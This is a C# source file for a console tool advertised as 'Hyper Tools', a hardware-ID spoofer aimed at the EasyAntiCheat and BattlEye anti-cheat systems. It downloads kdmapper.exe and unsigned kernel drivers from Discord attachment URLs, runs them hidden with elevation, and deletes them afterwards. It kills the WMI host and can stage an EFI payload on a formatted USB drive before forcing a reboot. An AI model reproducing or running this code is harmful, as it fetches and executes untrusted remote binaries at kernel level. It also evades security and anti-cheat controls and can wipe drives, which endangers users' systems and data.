using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Microsoft.VisualBasic;
using System.Windows.Forms;
using System.IO;
using System.Management;
using System.Diagnostics;
using System.Net;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace diskspace.cc
{
    class soarwazhere
    {

        static ConsoleColor color = ConsoleColor.DarkBlue;
        static void WriteLine(string line)
        {
            Console.Write("  ");
            Thread.Sleep(20);
            Console.BackgroundColor = color;
            Console.ForegroundColor = color;
            Console.Write(" ");
            Console.ResetColor();
            Thread.Sleep(20);
            Console.Write("  ");
            for (int i = 0; i < line.Length; i++)
            {
                Console.Write(line[i]);
                Thread.Sleep(20);
            }
            Thread.Sleep(20);
            Console.WriteLine();
        }

        static void WriteLineAlt(string line)
        {
            Console.Write("  ");
            Console.BackgroundColor = color;
            Console.ForegroundColor = color;
            Console.Write(" ");
            Console.ResetColor();
            Console.Write("  ");
            Console.Write(line);
            Thread.Sleep(20);
            Console.WriteLine();
        }

        static void WriteBarrierLine(string num, string line)
        {
            Console.Write("  ");
            Thread.Sleep(20);
            Console.BackgroundColor = color;
            Console.ForegroundColor = color;
            Console.Write(" ");
            Console.ResetColor();
            Console.Write("  [");
            Thread.Sleep(20);
            Console.ForegroundColor = color;
            Console.Write(num);
            Console.ResetColor();
            Thread.Sleep(20);
            Console.Write("] ");
            for (int i = 0; i < line.Length; i++)
            {
                Console.Write(line[i]);
                Thread.Sleep(20);
            }
            Thread.Sleep(20);
            Console.WriteLine();
        }

        static void WriteSpacing(bool writeline)
        {
            if (!writeline)
            {
                Console.Write("  ");
                Thread.Sleep(20);
                Console.BackgroundColor = color;
                Console.ForegroundColor = color;
                Console.Write(" ");
                Console.ResetColor();
            }
            if (writeline)
            {
                Console.Write("  ");
                Thread.Sleep(20);
                Console.BackgroundColor = color;
                Console.ForegroundColor = color;
                Console.WriteLine(" ");
                Console.ResetColor();
            }
        }

        public static bool FormatDrive_CommandLine(char driveLetter, string label = "", string fileSystem = "NTFS", bool quickFormat = true, bool enableCompression = false, int? clusterSize = null)
        {
            #region args check

            if (!Char.IsLetter(driveLetter))
            {
                return false;
            }

            #endregion
            bool success = false;
            string drive = driveLetter + ":";
            try
            {
                var di = new DriveInfo(drive);
                var psi = new ProcessStartInfo();
                psi.FileName = "format.com";
                psi.CreateNoWindow = true; //if you want to hide the window
                psi.WorkingDirectory = Environment.SystemDirectory;
                psi.Arguments = "/FS:" + fileSystem +
                                             " /Y" +
                                             " /V:" + label +
                                             (quickFormat ? " /Q" : "") +
                                             ((fileSystem == "NTFS" && enableCompression) ? " /C" : "") +
                                             (clusterSize.HasValue ? " /A:" + clusterSize.Value : "") +
                                             " " + drive;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardInput = true;
                var formatProcess = Process.Start(psi);
                var swStandardInput = formatProcess.StandardInput;
                swStandardInput.WriteLine();
                formatProcess.WaitForExit();
                success = true;
            }
            catch (Exception) { }
            return success;
        }

        static void SpoofBE()
        {
            // download files
            WebClient wb = new WebClient();
            WriteLine("Downloading Drives...");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1139896959159783516/kdmapper.exe", @"C:\Windows\soar.exe");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1139896840347725946/Kernel.sys", @"C:\Windows\soarBE.sys");
            Thread.Sleep(500);
            WriteLine("Downloaded Drives.");



            // mapper vars
            WriteLine("Attempting to Start Drives...");
            Start(@"C:\Windows\soar.exe", @"C:\Windows\soarBE.sys");
            WriteLine("Drive Started.");

            //restart wmiprovider
            WriteLine("Restarting Host...");
            foreach (var process in Process.GetProcessesByName("WmiPrvSE"))
            {
                process.Kill();
            }
            WriteLine("WMI Host Restarted.");



            //del file
            File.Delete(@"C:\Windows\soar.exe");
            File.Delete(@"C:\Windows\soarBE.sys");
            WriteLine("Bin Drives Deleted.");
            Console.WriteLine();
            WriteLine("SerialNumber : [N/A]");
        }

        static string GetHardDiskSerialNo()
        {
            ManagementClass mangnmt = new ManagementClass("Win32_DiskDrive");
            ManagementObjectCollection mcol = mangnmt.GetInstances();
            string result = "";
            foreach (ManagementObject strt in mcol)
            {
                result += Convert.ToString(strt["SerialNumber"]);
            }
            return result;
        }

        static void Start(string path, [Optional] string optional)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.FileName = path;
            proc.StartInfo.Arguments = optional;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
            proc.WaitForExit();
        }

        static void SpoofEAC()
        { 
            // download files
            WebClient wb = new WebClient();
            WriteLine("Downloading Drives...");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1139896959159783516/kdmapper.exe", @"C:\Windows\soar.exe");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1139896689541517422/Kernel.sys", @"C:\Windows\soarEAC.sys");
            Thread.Sleep(500);
            WriteLine("Downloaded Drives.");



            // mapper vars
            WriteLine("Attempting to Start Drives...");
            Start(@"C:\Windows\soar.exe", @"C:\Windows\soarEAC.sys");
            WriteLine("Drive Started.");

            //restart wmiprovider
            WriteLine("Restarting Host...");
            foreach (var process in Process.GetProcessesByName("WmiPrvSE"))
            {
                process.Kill();
            }
            WriteLine("WMI Host Restarted.");



            //del file
            File.Delete(@"C:\Windows\soar.exe");
            File.Delete(@"C:\Windows\soarEAC.sys");
            WriteLine("Bin Drives Deleted.");
            Console.WriteLine();
            WriteLine("SerialNumber : " + GetHardDiskSerialNo());
        }

        static void TempSpoof()
        {
            Console.Clear();
            Console.Title = " ";
            Console.WriteLine();
            WriteLineAlt("diskspace.cc");
            WriteLineAlt("dc : diskpartmgr");
            WriteSpacing(true);
            WriteBarrierLine("1", "EasyAntiCheat");
            WriteBarrierLine("2", "BattleEye");
            WriteSpacing(true);
            WriteSpacing(false);
            Console.Write("   -> ");
            string lol = Console.ReadLine();
            if (lol == "1")
            {
                Console.Clear();
                Console.WriteLine();
                WriteLine("Attempting EAC...");
                Console.WriteLine();
                Thread.Sleep(2000);
                SpoofEAC();
                WriteLine("Successfully Spoofed");
                Thread.Sleep(5000);
                Main(null);
            }
            if (lol == "2")
            {
                Console.Clear();
                Console.WriteLine();
                WriteLine("Attempting BE...");
                Console.WriteLine();
                Thread.Sleep(2000);
                SpoofBE();
                WriteLine("Successfully Spoofed");
                Thread.Sleep(5000);
                Main(null);
            }
            TempSpoof();
            Thread.Sleep(-1);
        }

        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        enum MonitorState
        {
            ON = -1,
            OFF = 2,
            STANDBY = 1
        }
        static void SetMonitorState(MonitorState state)
        {
            Form frm = new Form();
            SendMessage(frm.Handle, 0x0112, (IntPtr)0xF170, (IntPtr)state);
        }

        private static void StartShutDown(string param)
        {
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.FileName = "cmd";
            proc.CreateNoWindow = true;
            proc.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Arguments = "/C shutdown " + param;
            Process.Start(proc);
            SetMonitorState(MonitorState.OFF);
        }

        public static void Restart()
        {
            StartShutDown("-f -r -t 5");
        }


        static void StartBiosDownload(string path)
        {
            WriteSpacing(true);
            Thread.Sleep(2000);
            WriteLine("Installing USB Hardware...");
            Thread.Sleep(1000);
            WebClient wb = new WebClient();
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1140144332930813982/efi.zip", path + "soarwazhere.zip");
            ZipFile.ExtractToDirectory(path + "soarwazhere.zip", path);
            File.Delete(path + "soarwazhere.zip");
            WriteLine("Successfully Installed Boot Device.");
            Thread.Sleep(500);
            WriteLine("Installing Drives...");
            wb.DownloadFile("https://cdn.discordapp.com/attachments/1139660034482127022/1139896689541517422/Kernel.sys", @"C:\soarwazhere.sys");
            WriteLine("Installed Drive.");
            WriteSpacing(false);
            Console.Write("  Restart (Y/N) -> ");
            DialogResult result3 = MessageBox.Show("WARNING :: Pressing Yes On this box will restart your computer allowing you to load the uefi drive, continue ?", "scformater", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result3 == DialogResult.Yes)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Yes");
                Thread.Sleep(3000);
                Restart();
            }
            if (result3 != DialogResult.Yes)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No");
            }
            Thread.Sleep(3000);
            Main(null);
        }
        [STAThread]
        static void BiosSpoofing()
        {
            Console.Clear();
            Console.Title = " ";
            Console.WriteLine();
            WriteLineAlt("diskspace.cc");
            WriteLineAlt("dc : diskpartmgr");
            WriteSpacing(true);
            WriteSpacing(false);
            Console.Write("  USB / Section Path -> ");
            string path = "NULL";
            using (var dialog = new FolderBrowserDialog())
            {
                DialogResult result = dialog.ShowDialog();
                if (result == DialogResult.OK)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(dialog.SelectedPath);
                    if (dialog.SelectedPath.StartsWith("C"))
                    {
                        Thread.Sleep(2000);
                        MessageBox.Show("This cannot be installed on your C Drive.", null, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Environment.Exit(0);
                    }
                    if (dialog.SelectedPath.Length != 3)
                    {
                        Thread.Sleep(2000);
                        MessageBox.Show("This Is Not a Valid Boot Drive.", null, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Environment.Exit(0);
                    }
                    path = dialog.SelectedPath;
                }
                else if (result != DialogResult.OK)
                {
                    BiosSpoofing();
                }

            }
            WriteSpacing(false);
            Console.Write("  Format (Y/N) -> ");
            DialogResult result3 = MessageBox.Show("Format Partition / USB To Support Booting ?", "scformater", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result3 == DialogResult.Yes)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Yes");
                if (FormatDrive_CommandLine(path[0], "diskspace.cc", "FAT32", true, false))
                    WriteLine("Successfully Formated Drive.");
                StartBiosDownload(path);
            }
            if (result3 != DialogResult.Yes)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No");
                StartBiosDownload(path);
            }


            Thread.Sleep(-1);
        }
        static bool reg = false;
        [STAThread]
        static void Main(string[] args)
        {


            Console.Clear();
            Console.Title = " ";
            Console.WriteLine();
            WriteLine("Hyper Tools");
            WriteLineAlt("discord.gg/hypertools");
            WriteSpacing(true);
            WriteBarrierLine("1", "Temporary Spoofing");
            WriteBarrierLine("2", @"""Permanent"" Spoofing");
            WriteSpacing(true);
            WriteSpacing(false);
            Console.Write("   -> ");
            string lol = Console.ReadLine();
            if (lol == "1")
            {
                TempSpoof();
            }
            if (lol == "2")
            {
                Console.Clear();
                BiosSpoofing();
            }
            Thread.Sleep(-1);
        }
    }
}
